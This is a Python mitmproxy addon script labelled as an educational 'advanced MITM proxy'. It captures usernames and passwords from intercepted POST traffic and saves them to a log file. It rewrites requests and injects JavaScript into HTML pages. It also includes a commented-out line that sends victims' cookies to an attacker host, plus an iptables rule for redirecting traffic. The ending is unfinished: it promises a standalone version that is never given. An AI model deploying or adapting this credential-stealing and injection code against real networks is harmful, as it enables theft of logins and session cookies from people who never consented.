#!/usr/bin/env python3
"""
========================================
ADVANCED MITM PROXY
========================================
This is a full-featured MITM proxy that can:
1. Intercept HTTP traffic
2. Read credentials
3. Modify requests/responses
4. Inject malicious content

This demonstrates the FULL power (and danger) of MITM attacks!

‚ö†Ô∏è EXTREMELY DANGEROUS - EDUCATIONAL ONLY ‚ö†Ô∏è
========================================
"""

from mitmproxy import http, ctx
from mitmproxy.tools.main import mitmdump
import sys
import re
import json

# ========================================
# CONFIGURATION
# ========================================
PROXY_PORT = 8888
LOG_FILE = "mitm_log.txt"

# ========================================
# COLOR CODES FOR TERMINAL OUTPUT
# ========================================
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

# ========================================
# MITM ADDON CLASS
# ========================================
class MITMAddon:
    """
    Main MITM proxy addon.
    This class has methods that are called automatically
    by mitmproxy when traffic flows through it.
    """

    def __init__(self):
        self.credentials_captured = []
        self.requests_intercepted = 0
        self.responses_modified = 0

    # ========================================
    # STEP 1: INTERCEPT REQUESTS
    # ========================================
    def request(self, flow: http.HTTPFlow) -> None:
        """
        Called for every HTTP request that passes through the proxy.

        Args:
            flow: HTTP flow object containing request/response data
        """
        self.requests_intercepted += 1

        # ========================================
        # LOG REQUEST DETAILS
        # ========================================
        request = flow.request
        print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
        print(f"{Colors.BOLD}[‚Üí] HTTP REQUEST #{self.requests_intercepted}{Colors.RESET}")
        print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")
        print(f"  Method:  {Colors.YELLOW}{request.method}{Colors.RESET}")
        print(f"  URL:     {Colors.BLUE}{request.pretty_url}{Colors.RESET}")
        print(f"  Host:    {Colors.GREEN}{request.host}{Colors.RESET}")

        # ========================================
        # CHECK FOR CREDENTIALS IN POST DATA
        # ========================================
        if request.method == "POST":
            self.extract_credentials(flow)

        # ========================================
        # OPTIONAL: MODIFY THE REQUEST
        # ========================================
        # Uncomment to inject extra parameters!
        # self.modify_request(flow)

    # ========================================
    # STEP 2: EXTRACT CREDENTIALS
    # ========================================
    def extract_credentials(self, flow: http.HTTPFlow) -> None:
        """
        Extract credentials from POST requests.

        Args:
            flow: HTTP flow object
        """
        request = flow.request

        print(f"\n  {Colors.RED}[!] POST request detected{Colors.RESET}")

        # ========================================
        # GET POST DATA
        # ========================================
        try:
            # Get the request body
            body = request.get_text()

            print(f"  {Colors.YELLOW}POST Data:{Colors.RESET}")
            print(f"  {body[:200]}{'...' if len(body) > 200 else ''}")

            # ========================================
            # PARSE FORM DATA
            # ========================================
            # Try to parse as URL-encoded form
            if "username" in body or "password" in body:
                username = self._extract_param(body, 'username') or \
                          self._extract_param(body, 'user') or \
                          self._extract_param(body, 'login')

                password = self._extract_param(body, 'password') or \
                          self._extract_param(body, 'pass') or \
                          self._extract_param(body, 'pwd')

                if username and password:
                    # ========================================
                    # CREDENTIALS FOUND!
                    # ========================================
                    print(f"\n  {Colors.RED}{'üö®'*20}{Colors.RESET}")
                    print(f"  {Colors.RED}{Colors.BOLD}CREDENTIALS CAPTURED!{Colors.RESET}")
                    print(f"  {Colors.RED}{'üö®'*20}{Colors.RESET}")
                    print(f"  Username: {Colors.GREEN}{username}{Colors.RESET}")
                    print(f"  Password: {Colors.GREEN}{password}{Colors.RESET}")
                    print(f"  URL:      {Colors.BLUE}{request.pretty_url}{Colors.RESET}")

                    # Save credentials
                    cred = {
                        'username': username,
                        'password': password,
                        'url': request.pretty_url,
                        'host': request.host
                    }
                    self.credentials_captured.append(cred)
                    self.save_credentials(cred)

            # ========================================
            # PARSE JSON DATA
            # ========================================
            elif request.headers.get("content-type", "").startswith("application/json"):
                try:
                    data = json.loads(body)
                    if 'username' in data and 'password' in data:
                        print(f"\n  {Colors.RED}CREDENTIALS in JSON:{Colors.RESET}")
                        print(f"  Username: {Colors.GREEN}{data['username']}{Colors.RESET}")
                        print(f"  Password: {Colors.GREEN}{data['password']}{Colors.RESET}")

                        cred = {
                            'username': data['username'],
                            'password': data['password'],
                            'url': request.pretty_url,
                            'host': request.host
                        }
                        self.credentials_captured.append(cred)
                        self.save_credentials(cred)
                except json.JSONDecodeError:
                    pass

        except Exception as e:
            ctx.log.error(f"Error extracting credentials: {e}")

    # ========================================
    # STEP 3: INTERCEPT RESPONSES
    # ========================================
    def response(self, flow: http.HTTPFlow) -> None:
        """
        Called for every HTTP response from the server.

        Args:
            flow: HTTP flow object
        """
        response = flow.response

        print(f"\n{Colors.MAGENTA}{'='*60}{Colors.RESET}")
        print(f"{Colors.BOLD}[‚Üê] HTTP RESPONSE{Colors.RESET}")
        print(f"{Colors.MAGENTA}{'='*60}{Colors.RESET}")
        print(f"  Status:  {Colors.YELLOW}{response.status_code}{Colors.RESET}")
        print(f"  URL:     {Colors.BLUE}{flow.request.pretty_url}{Colors.RESET}")

        # ========================================
        # OPTIONAL: MODIFY THE RESPONSE
        # ========================================
        # Uncomment to inject malicious content!
        # if "text/html" in response.headers.get("content-type", ""):
        #     self.inject_malicious_html(flow)

    # ========================================
    # STEP 4: MODIFY REQUEST (OPTIONAL)
    # ========================================
    def modify_request(self, flow: http.HTTPFlow) -> None:
        """
        Modify the request before it reaches the server.

        Example: Change username from 'alice' to 'admin'
        """
        request = flow.request

        if request.method == "POST":
            try:
                body = request.get_text()

                # Change username parameter
                if "username=alice" in body:
                    new_body = body.replace("username=alice", "username=admin")
                    request.text = new_body

                    print(f"\n  {Colors.RED}[!] REQUEST MODIFIED!{Colors.RESET}")
                    print(f"  Changed 'alice' to 'admin'")

            except Exception as e:
                pass

    # ========================================
    # STEP 5: INJECT MALICIOUS HTML (OPTIONAL)
    # ========================================
    def inject_malicious_html(self, flow: http.HTTPFlow) -> None:
        """
        Inject malicious JavaScript into HTML responses.

        Example: Inject a fake alert or redirect
        """
        response = flow.response

        try:
            html = response.get_text()

            # ========================================
            # INJECT MALICIOUS SCRIPT
            # ========================================
            malicious_script = """
            <script>
                // This could be a keylogger, credential stealer, etc.
                alert('‚ö†Ô∏è HACKED! This page has been compromised!');

                // Example: Send cookies to attacker
                // fetch('http://attacker.com/steal?cookie=' + document.cookie);
            </script>
            """

            # Inject before </body> tag
            if "</body>" in html:
                html = html.replace("</body>", malicious_script + "</body>")
                response.text = html

                self.responses_modified += 1

                print(f"\n  {Colors.RED}[!] RESPONSE MODIFIED!{Colors.RESET}")
                print(f"  Injected malicious JavaScript")

        except Exception as e:
            pass

    # ========================================
    # HELPER: EXTRACT PARAMETER FROM FORM DATA
    # ========================================
    def _extract_param(self, body: str, param: str) -> str:
        """
        Extract a parameter value from URL-encoded form data.

        Args:
            body: Request body
            param: Parameter name

        Returns:
            str: Parameter value or None
        """
        pattern = f"{param}=([^&]+)"
        match = re.search(pattern, body)
        if match:
            import urllib.parse
            return urllib.parse.unquote_plus(match.group(1))
        return None

    # ========================================
    # SAVE CREDENTIALS TO FILE
    # ========================================
    def save_credentials(self, cred: dict) -> None:
        """
        Save captured credentials to log file.

        Args:
            cred: Dictionary with credential data
        """
        try:
            with open(LOG_FILE, 'a') as f:
                f.write("="*60 + "\n")
                f.write(f"URL:      {cred['url']}\n")
                f.write(f"Host:     {cred['host']}\n")
                f.write(f"Username: {cred['username']}\n")
                f.write(f"Password: {cred['password']}\n")
                f.write("="*60 + "\n\n")

            print(f"  {Colors.GREEN}[+] Saved to {LOG_FILE}{Colors.RESET}")
        except Exception as e:
            print(f"  {Colors.RED}[-] Error saving: {e}{Colors.RESET}")

# ========================================
# MAIN ENTRY POINT
# ========================================
def main():
    """
    Start the MITM proxy using mitmproxy.
    """
    print("="*60)
    print("üé≠ ADVANCED MITM PROXY")
    print("="*60)
    print(f"[*] Proxy will listen on port {PROXY_PORT}")
    print(f"[*] Credentials will be saved to {LOG_FILE}")
    print("="*60)
    print("\nTo use this proxy:")
    print(f"  1. Configure your browser/client to use proxy: 127.0.0.1:{PROXY_PORT}")
    print("  2. OR use iptables to redirect traffic:")
    print(f"     iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port {PROXY_PORT}")
    print("\n[*] Press Ctrl+C to stop")
    print("="*60 + "\n")

# ========================================
# STANDALONE SCRIPT (Alternative Implementation)
# ========================================
"""
If you don't have mitmproxy installed, here's a simpler version
using just Python's http.server:
"""

if __name__ == "__main__":
    print("\n" + "‚ö†Ô∏è "*20)
    print("WARNING: This is an extremely powerful and dangerous tool!")
    print("Only use in controlled lab environments with permission!")
    print("Unauthorized use is ILLEGAL!")
    print("‚ö†Ô∏è "*20 + "\n")

    response = input("Do you understand and want to continue? (yes/no): ")
    if response.lower() != 'yes':
        print("Exiting...")
        sys.exit(0)

    print("\n" + "="*60)
    print("MITM PROXY SETUP")
    print("="*60)
    print("\nThis requires the 'mitmproxy' package.")
    print("Install it with: pip install mitmproxy")
    print("\nTo run the proxy:")
    print(f"  mitmdump -s mitm_proxy.py -p {PROXY_PORT}")
    print("\nOr use the standalone HTTP proxy version below...")
    print("="*60)

    # Register the addon
    addons = [MITMAddon()]
